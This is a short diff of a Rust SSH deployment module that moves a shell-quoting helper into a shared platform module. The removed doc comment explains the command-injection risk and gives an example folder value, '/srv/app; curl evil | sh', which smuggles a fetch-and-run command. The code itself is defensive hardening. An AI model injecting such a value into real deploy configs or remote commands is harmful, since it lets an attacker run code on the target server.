@@ -4,6 +4,7 @@
 //! which only need to read the file still compile on Windows.
 
 use super::deploy_config::{DeployConfig, DeployMode, ServerConfig};
+use crate::platform::process::shell_quote;
 use ssh2::Session;
 use std::io::{Read, Write};
 use std::net::TcpStream;
@@ -229,16 +230,6 @@ async fn sync_code_rsync(
 
     println!("[{}] Code synced ✓", server.name);
     Ok(())
-}
-
-/// POSIX single-quote a value for safe interpolation into a remote shell
-/// command. Deploy config (`server.folder`, git URL/branch/subfolder) is
-/// otherwise concatenated straight into strings passed to the remote login
-/// shell, so a folder like `/srv/app; curl evil | sh` would be command
-/// injection on the deploy target. Single-quoting neutralizes every shell
-/// metacharacter; an embedded `'` is closed, backslash-escaped, and reopened.
-fn shell_quote(value: &str) -> String {
-    format!("'{}'", value.replace('\'', "'\\''"))
 }
 
 async fn ensure_remote_folder(server: &ServerConfig) -> Result<(), String> {
